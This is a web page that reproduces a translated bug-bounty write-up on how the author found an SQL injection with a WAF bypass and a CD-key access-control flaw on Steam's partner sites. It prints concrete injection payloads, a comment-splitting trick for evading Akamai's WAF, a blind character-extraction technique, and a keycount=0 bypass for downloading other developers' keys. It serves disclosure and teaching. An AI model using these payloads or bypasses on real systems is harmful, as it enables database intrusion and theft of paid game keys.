<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How I hacked Steam. Twice</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hi, Habr! Today, I‚Äôll tell you what Valve paid the most bounties in the history of their reward program for vulnerabilities. Welcome under the cut! 

...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How I hacked Steam. Twice</h1><div class="post__text post__text-html js-mediator-article">  Hi, Habr!  Today, I‚Äôll tell you what Valve paid the most bounties in the history of their reward program for vulnerabilities.  Welcome under the cut! <br><br><img src="https://habrastorage.org/webt/6j/zb/jq/6jzbjqwm54kjaonciarskoos0fi.png"><br><a name="habracut"></a><br><h3>  1. SQL Injection </h3><br>  The service <i>partner.steampowered.com is</i> intended to provide financial information for Steam partners.  On the sales report page, a graph is drawn with buttons that change the display period of the statistics.  Here they are in a green rectangle: <br><br><img src="https://habrastorage.org/webt/kx/sv/rr/kxsvrry7aicwzjut5chb_j2exhg.png">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The request for loading statistics looks like this: <br><br><img src="https://habrastorage.org/webt/vb/26/vy/vb26vydaudwl7rcusm0vyjnek14.png"><br>  <i>where ‚ÄúUA‚Äù is the country code.</i> <br><br>  Well, it's time for quotes! <br>  Let's try "UA '": <br><br><img src="https://habrastorage.org/webt/7s/xu/fp/7sxufpkpcieqwxldj8yuklhui2g.png"><br><br>  The statistics did NOT return, which was to be expected. <br><br>  Now "UA": <br><br><img src="https://habrastorage.org/webt/f9/pz/pm/f9pzpmv4lem2283_qopey71x69k.png"><br><br>  The statistics are back and it looks like an injection! <br><br><div class="spoiler">  <b class="spoiler_title">Why?</b> <div class="spoiler_text">  Suppose that the database instruction looks like this: <br><br><pre><code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> countries <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> country_code = <span class="hljs-string"><span class="hljs-string">`UA`</span></span>;</code> </pre> <br>  If you send UA ', then the instruction to the database will be: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> countries <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> country_code = <span class="hljs-string"><span class="hljs-string">`UA`</span></span><span class="hljs-string"><span class="hljs-string">`;</span></span></code> </pre> <br>  Notice the extra quote?  This means that the instruction is invalid. <br>  Corresponding to the SQL syntax, the query below is completely valid (there are no extra quotes): <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> countries <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> country_code = <span class="hljs-string"><span class="hljs-string">`UA`</span></span><span class="hljs-string"><span class="hljs-string">``</span></span>;</code> </pre> </div></div><br>  Note that we are dealing with an array of <b>countryFilter []</b> .  I assumed that if in the request to duplicate the <b>countryFilter []</b> parameter several times, all the values ‚Äã‚Äãthat we send will be combined in the SQL query in the following way: <br><br><pre> <code class="sql hljs">'value1', 'value2', 'value3'</code> </pre> <br>  Check and make sure: <br><br><img src="https://habrastorage.org/webt/tm/t0/ub/tmt0ubgrptaw2iy8gfxwqwkqvnm.png"><br><br>  In fact, we requested the statistics of three countries from the database: <br><br><pre> <code class="sql hljs">`UA`, `,` ,`RU`</code> </pre> <br>  The syntax is correct - the statistics returned :) <br><br>  <b>Web Application Firewall bypass</b> <br><br>  Steam servers are hiding behind Akamai WAF.  This disgrace inserts stick in the wheels of good (and not very) hackers.  However, I managed to overcome it by combining the values ‚Äã‚Äãof the array into one query (what I explained above) and commenting.  First, make sure the last one: <br><br><pre> <code class="hljs objectivec">?countryFilter[]=UA`<span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>,`RU</code> </pre> <br>  The request is valid, so there are comments in our assortment. <br><blockquote>  We had several syntax options, local databases for testing payloads, comment symbols and an infinite number of quotes for all encodings, as well as self-written scripts on Python, documentation on all databases, instructions for circumventing firewalls, Wikipedia and anti-mail.  Not that it was the necessary reserve for the promotion of the injection, but since it began to break the database, it is difficult to stop ... </blockquote>  WAF blocks the request when it encounters a function.  Did you know that <b>DB_NAME</b> / ** / <b>()</b> is a valid function call?  The firewall also knows and blocks.  But, thanks to this feature, we can divide the function call into two parameters! <br><br><pre> <code class="hljs scala">?countryFilter[]=<span class="hljs-type"><span class="hljs-type">UA</span></span>',<span class="hljs-type"><span class="hljs-type">DB_NAME</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>(),<span class="hljs-symbol"><span class="hljs-symbol">'RU</span></span></code> </pre> <br>  We sent a request from <b>DB_NAME</b> / * <i>anyway</i> * / <b>()</b> - WAF did not understand anything, but the database successfully processed such an instruction. <br><br>  <b>Retrieving values ‚Äã‚Äãfrom a database</b> <br><br>  So, an example of getting the length of a DB_NAME () value: <br><br><pre> <code class="hljs sql">https://partner.steampowered.com/report_xml.php?query=QuerySteamHistory&amp;countryFilter[]=',(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">CASE</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">WHEN</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">len</span></span>(DB_NAME<span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>())<span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span>)<span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">THEN</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-string"><span class="hljs-string">'UA'</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">ELSE</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span><span class="hljs-string"><span class="hljs-string">'qwerty'</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">END</span></span>),<span class="hljs-string"><span class="hljs-string">'</span></span></code> </pre><br>  In SQL: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">CASE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">WHEN</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">len</span></span>(DB_NAME())= <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">THEN</span></span> <span class="hljs-string"><span class="hljs-string">'UA'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">ELSE</span></span> <span class="hljs-string"><span class="hljs-string">'qwerty'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">END</span></span></code> </pre> <br>  Well, humanly: <br><br><pre> <code class="sql hljs">  DB_NAME()  "1",   ‚ÄúUA‚Äù,   ‚Äúqwerty‚Äù.</code> </pre> <br>  This means that if the comparison is true, then in response we will receive statistics for the country ‚ÄúUA‚Äù.  It is not difficult to guess that going through the values ‚Äã‚Äãfrom 1 to infinity, we will find the right one sooner or later. <br><br>  In the same way, you can iterate through text values: <br><br><pre> <code class="sql hljs">   DB_NAME()  ‚Äúa‚Äù,  "UA",  "qwerty".</code> </pre> <br>  Usually, the ‚Äúsubstring‚Äù function is used to get the N-th character, but WAF stubbornly blocked it.  Here the combination came to the rescue: <br><br><pre> <code class="sql hljs">right(left(system_user,N),1)</code> </pre> <br>  How it works?  We get N characters of the system_user value from which we take the last one. <br>  Imagine that system_user = ‚Äústeam‚Äù.  This is how the third character will look like: <br><br><pre> <code class="sql hljs">left(system_user,3) = ste right(‚Äúste‚Äù,1) = e</code> </pre> <br>  Using a simple script, this process was automated and I got the hostname, system_user, version and the names of all the databases.  This information is more than enough (the latter is even superfluous, but it was interesting) to demonstrate criticality. <br><br>  After 5 hours, the vulnerability was corrected, but the status of triaged (adopted) was put to her after 8 hours and, damn it, for me it was a very difficult 3 hours during which my brain managed to survive the stages from denial to acceptance. <br><br><div class="spoiler">  <b class="spoiler_title">Clarification of paranoia</b> <div class="spoiler_text">  Since the vulnerability was not designated as accepted, I pushed that the turn to my report had not yet reached.  But the bug was fixed, which means it could have been reported before me. <br></div></div><br><h3>  2. Getting all the keys from any game </h3><br>  In the Steam partner interface there is the functionality of generating keys to the games. <br>  Download the generated set of keys, you can use the request: <br><br><pre> <code class="hljs ruby"><span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/partner.steamgames.com/partnercdkeys</span></span><span class="hljs-regexp"><span class="hljs-regexp">/assignkeys/</span></span> &amp;sessionid=xxxxxxxxxxxxx&amp;keyid=<span class="hljs-number"><span class="hljs-number">123456</span></span>&amp;sourceAccount=xxxxxxxxx&amp;appid=xxxxxx&amp;keycount=<span class="hljs-number"><span class="hljs-number">1</span></span>&amp;generateButton=Download</code> </pre> <br>  In this query, the <b>keyid</b> parameter is the id of the key set, and <b>keycount</b> is the number of keys that must be obtained from the given set. <br><br>  Of course, my hands instantly reached out to drive in different <b>keyids</b> , but in response, I <i>received an</i> error: ‚Äú <i>Couldn`t generate CD keys: No assignment for user.</i>  ".  It turned out not so simple, and Steam checked if the requested set of keys belonged to me.  How did I get around this check?  Attention‚Ä¶ <br><br><pre> <code class="hljs">keycount=0</code> </pre> <br>  Generated a file with 36,000 keys from the game Portal 2. Wow. <br>  Only one set turned out that number of keys.  And the total sets at the moment more than 430,000.  Thus, going through the <b>keyid</b> values <b>,</b> <s>I was a</s> potential attacker who could download all the keys ever generated by the Steam game developers. <br><br><h3>  findings </h3><br><ul><li>  Costly WAF systems from top companies are not a guarantee for the security of your web applications. </li><li>  If you are a bug hunter, then try to penetrate as deep as possible.  The fewer users have access to the interface, the more likely it is to find a vulnerability in this interface. </li><li>  Developers and business owners, there are no absolutely safe applications!  But you hold on.  Have a good mood! <br></li></ul><br><div class="spoiler">  <b class="spoiler_title">But seriously</b> <div class="spoiler_text">  Make pentests, pay for vulnerabilities, think strategically. <br></div></div></div><p>Source: <a href="https://habr.com/ru/post/421215/">https://habr.com/ru/post/421215/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../421205/index.html">September 1, 110 years ago: trigonometry, the dollar rate and sparklers</a></li>
<li><a href="../421207/index.html">Situation: two vulnerabilities are closed in the Linux kernel TCP stack</a></li>
<li><a href="../421209/index.html">IaaS in eCommerce and finance: who and why switched to virtual infrastructure</a></li>
<li><a href="../421211/index.html">PowerShell and Group Policy Preferences, when the printers account for hundreds</a></li>
<li><a href="../421213/index.html">DJI Mavic 2 Pro / Zoom in detail</a></li>
<li><a href="../421217/index.html">Python support in Power BI</a></li>
<li><a href="../421221/index.html">Severe Therapy: Pale Anti-Fever for MacOS</a></li>
<li><a href="../421223/index.html">DevFest SPB 2018</a></li>
<li><a href="../421225/index.html">SENS-diagnostics. Biomarkers of mitochondrial dysfunction and oxidative stress</a></li>
<li><a href="../421227/index.html">Overview of cross-platform mobile development frameworks</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>